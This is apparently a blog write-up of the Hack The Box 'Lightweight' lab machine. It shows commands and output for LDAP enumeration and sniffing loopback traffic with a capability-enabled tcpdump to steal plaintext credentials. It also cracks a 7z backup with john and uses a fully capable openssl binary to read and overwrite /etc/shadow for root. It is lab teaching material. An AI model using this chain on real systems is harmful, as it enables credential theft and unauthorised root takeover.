---
layout: single
title: Lightweight - Hack The Box
excerpt: "Lightweight was a fun box that uses Linux capabilities set on tcpdump so we can capture packets on the loopback interface and find credentials in an LDAP session. We then find more credentials in the source code of the web application and finally priv esc to root by abusing a copy of the openssl program that all has Linux caps set on it."
date: 2019-05-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-lightweight/lightweight_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - john
  - ldap
  - caps
  - tcpdump
  - password cracking
---

![](/assets/images/htb-writeup-lightweight/lightweight_logo.png)

Lightweight was a fun box that uses Linux capabilities set on tcpdump so we can capture packets on the loopback interface and find credentials in an LDAP session. We then find more credentials in the source code of the web application and finally priv esc to root by abusing a copy of the openssl program that all has Linux caps set on it.

## Summary

- The main web page contains instructions on how to access the box by SSH (basically an account is automatically created based on the user's IP address)
- The `status.php` page does an LDAP query to the loopback interface, which can be intercepted since tcpdump is running with elevated caps
- The LDAP query contains the credentials for user `ldapuser2`
- User `ldapuser2` has access to the PHP source code for the web application, which has credentials for user `ldapuser1`
- There is an `openssl` binary in the home directory of `ldapuser1` with elevated caps that let us read/write any files on the system

### Portscan

We got SSH, Apache httpd and OpenLDAP runnning on this box.

```
root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.119
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-10 23:27 EST
Nmap scan report for 10.10.10.119
Host is up (0.024s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
```

### Web page

There's not much on the webpage except some instructions on how to login via SSH, how to reset the user password and a status check page.

![](/assets/images/htb-writeup-lightweight/page1.png)

![](/assets/images/htb-writeup-lightweight/page2.png)

![](/assets/images/htb-writeup-lightweight/page3.png)

One thing to note is the status page always take a long time to execute so there is probably some script running in the background.

As per the instruction, we can log in with our IP as username / password:

```
# ssh -l 10.10.14.23 10.10.10.119
10.10.14.23@10.10.10.119's password: 
[10.10.14.23@lightweight ~]$ id
uid=1004(10.10.14.23) gid=1004(10.10.14.23) groups=1004(10.10.14.23) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### LDAP enum

The LDAP server allows any user to search the directory and does not require authentication:

```
# ldapsearch -h 10.10.10.119 -b "dc=lightweight,dc=htb" -x

# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1

# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2
```

We can see two sets of credentials here. These are actually Base64 encoded versions of the Linux SHA512 hashes.

First hash decodes to: `{crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/`

None of the hashes could be cracked using `rockyou.txt`, so we have to get the password some other way.

### Checking caps

I checked the entire filesystem for any files running with elevated capabilities. Capabilities are used when a program need some kind of privilege that would normally require root access. With caps, we can give specific privileges to the binary without making the file suid or running it directly as root.

```
[10.10.14.23@lightweight ~]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

Here, `tcpdump` has some caps set to allow a regular user to capture traffic on any interface.

As per [http://man7.org/linux/man-pages/man7/capabilities.7.html](http://man7.org/linux/man-pages/man7/capabilities.7.html), the exact description of the caps are:

```
CAP_NET_ADMIN
    Perform various network-related operations:
    * interface configuration;
    * administration of IP firewall, masquerading, and accounting;
    * modify routing tables;
    * bind to any address for transparent proxying;
    * set type-of-service (TOS)
    * clear driver statistics;
    * set promiscuous mode;
    * enabling multicasting;

CAP_NET_RAW
    * Use RAW and PACKET sockets;
    * bind to any address for transparent proxying.
```

### Capturing traffic

There is an automated script on the box that connects locally to the LDAP server via the loopback interface. Because it's not using LDAPS, the credentials are in plaintext and I can capture them by sniffing the loopback interface.


```
[10.10.14.23@lightweight ~]$ tcpdump -nni lo -w /tmp/capture.pcap
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
```

After grabbing the .pcap file via scp, we can see the following LDAP query using simple authentication with user `ldapuser2`

![](/assets/images/htb-writeup-lightweight/ldap1.png)

And we've got the password in plaintext here:

![](/assets/images/htb-writeup-lightweight/ldap2.png)

`ldapuser2` password is: `8bc8251332abe1d7f105d3e53ad39ac2`

### Logging in as ldapuser2 and grabbing the user flag

We can't SSH in as `ldapuser2` but we're able to `su` to `ldapuser2`.

```
[10.10.14.23@lightweight ~]$ su -l ldapuser2
Password: 
Last login: Mon Dec 10 21:41:37 GMT 2018 on pts/1
Last failed login: Tue Dec 11 04:35:22 GMT 2018 from 10.10.14.23 on ssh:notty
There was 1 failed login attempt since the last successful login.
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt

[ldapuser2@lightweight ~]$ cat user.txt
8a866d...
```

### Privesc to ldapuser1

The `backup.7z` file in ldapuser2's home directory is our next logical target, however it has a password set on it:

```
# 7z e backup.7z 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
```

I'll use `7z2john` to extract the hash then crack it with `john`:
```
root@ragingunicorn:~/JohnTheRipper/run# ./7z2john.pl /root/tmp/backup.7z 

backup.7z:$7z$2$19$0$$8$11e96[...]

# ~/JohnTheRipper/run/john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
delete           (?)
1g 0:00:00:40 DONE (2018-12-10 23:59) 0.02448g/s 50.53p/s 50.53c/s 50.53C/s poison..nokia
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Password is : `delete`

```
# 7z x -obackup backup.7z 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
[...]
Size:       10270
Compressed: 3411
root@ragingunicorn:~/tmp# ls -l backup
total 24
-rw-r----- 1 root root 4218 Jun 13 14:48 index.php
-rw-r----- 1 root root 1764 Jun 13 14:47 info.php
-rw-r----- 1 root root  360 Jun 10  2018 reset.php
-rw-r----- 1 root root 2400 Jun 14 15:06 status.php
-rw-r----- 1 root root 1528 Jun 13 14:47 user.php
```

We have a backup of the web application source code and `status.php` contains credentials:

```php
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
```

We can then `su` to `ldapuser1` with that password:

```
[10.10.14.23@lightweight ~]$ su -l ldapuser1
Password: 
Last login: Tue Dec 11 02:01:07 GMT 2018 on pts/1
[ldapuser1@lightweight ~]$ ls 
capture.pcap  ldapTLS.php  openssl  tcpdump
```

### Final privesc 

Checking caps again, we see the `openssl` binary in the current directory has caps set:

```
[ldapuser1@lightweight ~]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
```

The `=ep` caps means the all capabilities are assigned to the file. We can read `/etc/shadow` with openssl by encrypting it to a file in our home directory, then decrypting it:

```
-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:
[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -d -a -in shadow.enc -out shadow
enter aes-256-cbc decryption password:
[ldapuser1@lightweight ~]$ cat shadow
root:$6$eVOz8tJs$xpjymy5BFFeCIHq9a.BoKZeyPReKd7pwoXnxFNOa7TP5ltNmSDsiyuS/ZqTgAGNEbx5jyZpCnbf8xIJ0Po6N8.:17711:0:99999:7:::
[...]
ldapuser1:$6$OZfv1n9[v$2gh4EFIrLW5hZEEzrVn4i8bYfXMyiPp2450odPwiL5yGOHYksVd8dCTqeDt3ffgmwmRYw49c]MFueNZNOoI6A1.:17691:365:99999:7:::
ldapuser2:$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1:17691:365:99999:7:::
10.10.14.2:clJFBL7EDs1H6:17851:0:99999:7:::
10.10.14.13:qehr2qxjyEzkw:17874:0:99999:7:::
10.10.14.26:syd74YenpBuf6:17875:0:99999:7:::
10.10.14.12:pdfLwDAqvvWI2:17876:0:99999:7:::
10.10.14.23:owYEfkaBVoeFI:17876:0:99999:7:::
```

We probably can't crack the root hash because the HTB boxes typically have a very complex password for the root account but we can replace the shadow file with an empty root password:

```
[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -a -salt -in shadow -out shadow.enc
enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:
[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -d -a -in shadow.enc -out /etc/shadow
enter aes-256-cbc decryption password:
[ldapuser1@lightweight ~]$ su -l root
Last login: Thu Dec  6 14:09:41 GMT 2018 on tty1
[root@lightweight ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[root@lightweight ~]# cat root.txt
f1d4e3...
```
